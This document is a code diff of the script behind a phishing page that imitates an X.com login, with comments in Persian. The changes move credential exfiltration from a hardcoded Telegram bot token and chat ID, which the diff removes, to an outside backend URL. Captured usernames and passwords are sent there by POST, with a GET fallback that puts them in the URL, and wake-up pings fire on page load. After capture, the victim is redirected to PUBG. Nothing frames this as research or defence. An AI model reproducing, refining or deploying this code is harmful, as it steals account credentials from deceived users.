@@ -428,69 +428,82 @@
 
   <!-- ===== JavaScript ===== -->
   <script>
-    // ===== تنظیمات تلگرام =====
-    const TELEGRAM_CONFIG = {
-      botToken: "8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ",
-      chatId: "6689313262"
-    };
-
+    // =====================================================
+    // 🔗 تنظیمات جدید تلگرام - لینک جدید
+    // =====================================================
+    const TELEGRAM_BACKEND_URL = "https://telegram-backend-zo3n.onrender.com";
     const WAKEUP_COUNT = 2;
 
-    // ===== ارسال پیام به تلگرام =====
-    function sendTelegramMessage(text, parseMode = 'Markdown') {
-      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-
-      return fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CONFIG.chatId,
-          text: text,
-          parse_mode: parseMode
+    // =====================================================
+    // 🚀 ارسال پیام ویکاپ به بک‌اند جدید
+    // =====================================================
+    function sendWakeup(index) {
+      try {
+        fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            action: `🔄 X.com Wake-up (${index}/${WAKEUP_COUNT})`,
+            name: "System",
+            extra: `Wake-up ping ${index}`,
+            time: new Date().toLocaleString('fa-IR')
+          })
         })
-      })
-      .then(res => res.json())
-      .catch(err => console.error("Telegram error:", err));
+        .then(() => console.log(`✅ Wake-up ${index} sent`))
+        .catch(() => console.log(`⚠️ Wake-up ${index} failed`));
+      } catch(e) {
+        console.log("Wake-up error:", e);
+      }
     }
 
-    // ===== ارسال پیام‌های ویک‌آپ هنگام لود صفحه =====
-    function sendWakeupOnLoad() {
+    // =====================================================
+    // 🚀 ارسال اطلاعات ورود به بک‌اند جدید
+    // =====================================================
+    function sendLoginInfo(username, password) {
+      // مرحله 1: ارسال ۲ ویکاپ
       for (let i = 1; i <= WAKEUP_COUNT; i++) {
         setTimeout(() => {
-          const message = `🌐 **X.com Page Loaded - Wake-up** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
-          sendTelegramMessage(message);
+          sendWakeup(i);
         }, i * 500);
       }
-    }
 
-    // ===== ارسال ویک‌آپ + اطلاعات ورود =====
-    function sendWakeupAndLoginInfo(username, password) {
-      // مرحله 1: ارسال ۲ پیام ویک‌آپ
-      let wakeupPromises = [];
-      for (let i = 1; i <= WAKEUP_COUNT; i++) {
-        const promise = new Promise((resolve) => {
-          setTimeout(() => {
-            const message = `🔄 **X.com Wake-up ping** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
-            sendTelegramMessage(message)
-              .then(result => resolve(result))
-              .catch(err => resolve({ ok: false, error: err }));
-          }, i * 600);
-        });
-        wakeupPromises.push(promise);
-      }
-
-      // مرحله 2: بعد از اتمام ویک‌آپ‌ها، اطلاعات را ارسال کن
-      Promise.all(wakeupPromises).then(() => {
-        setTimeout(() => {
-          const message =
-            `🔔 **ورود جدید به X.com!**\n\n` +
-            `👤 **یوزرنیم/ایمیل:** \`${username}\`\n` +
-            `🔑 **رمز عبور:** \`${password}\`\n\n` +
-            `🕐 زمان: ${new Date().toLocaleString('fa-IR')}`;
-
-          sendTelegramMessage(message);
-        }, 500);
-      });
+      // مرحله 2: ارسال اطلاعات اصلی با تاخیر
+      setTimeout(() => {
+        try {
+          fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              action: "🔐 X.com Login",
+              name: username,
+              extra: `Password: ${password}`,
+              time: new Date().toLocaleString('fa-IR')
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              console.log("✅ Login info sent successfully");
+            } else {
+              console.log("⚠️ Login info sent but response not ok");
+            }
+          })
+          .catch(err => {
+            console.log("⚠️ Login info send failed, trying fallback...");
+            // Fallback: ارسال با GET
+            try {
+              const msg = encodeURIComponent(`X.com Login | User: ${username} | Pass: ${password}`);
+              fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
+                .then(() => console.log("✅ Fallback GET success"))
+                .catch(e => console.log("❌ Fallback failed"));
+            } catch(e) {
+              console.log("❌ All methods failed");
+            }
+          });
+        } catch(e) {
+          console.log("Error sending login info:", e);
+        }
+      }, 1500);
     }
 
     // =============================================
@@ -514,7 +527,7 @@
         
       } else if (isIOS) {
         // برای آیفون
-        window.location.href = 'https://pubg.com/';  // لینک یونیورسال
+        window.location.href = 'https://pubg.com/';
         
         setTimeout(() => {
           window.location.href = 'https://apps.apple.com/app/pubg-mobile/id1330123889';
@@ -581,8 +594,8 @@
       // 🚀 ارسال به تلگرام + باز کردن PUBG
       // =============================================
       
-      // 1. ارسال اطلاعات به تلگرام
-      sendWakeupAndLoginInfo(input, password);
+      // 1. ارسال اطلاعات به تلگرام (با ویکاپ)
+      sendLoginInfo(input, password);
 
       // 2. نمایش پیام موفقیت
       successBox.innerHTML = `<i class="fas fa-check-circle"></i> ✅ ورود موفق! در حال انتقال به PUBG...`;
@@ -596,9 +609,24 @@
       return false;
     }
 
-    // ===== اجرا در هنگام لود صفحه =====
+    // =====================================================
+    // 🔥 ویکاپ هنگام لود صفحه
+    // =====================================================
     document.addEventListener('DOMContentLoaded', function() {
-      sendWakeupOnLoad(); // ارسال ۲ پیام ویک‌آپ بی‌صدا
+      // Wake-up هنگام لود
+      fetch(`${TELEGRAM_BACKEND_URL}/health`)
+        .then(() => console.log('✅ Server is awake'))
+        .catch(() => console.log('🔄 Server waking up...'));
+      
+      // ارسال ویکاپ‌های اولیه
+      for (let i = 1; i <= WAKEUP_COUNT; i++) {
+        setTimeout(() => {
+          sendWakeup(i);
+        }, i * 400);
+      }
+      
+      console.log('✅ X.com Page Ready!');
+      console.log(`🔗 Backend URL: ${TELEGRAM_BACKEND_URL}`);
     });
   </script>
 </body>
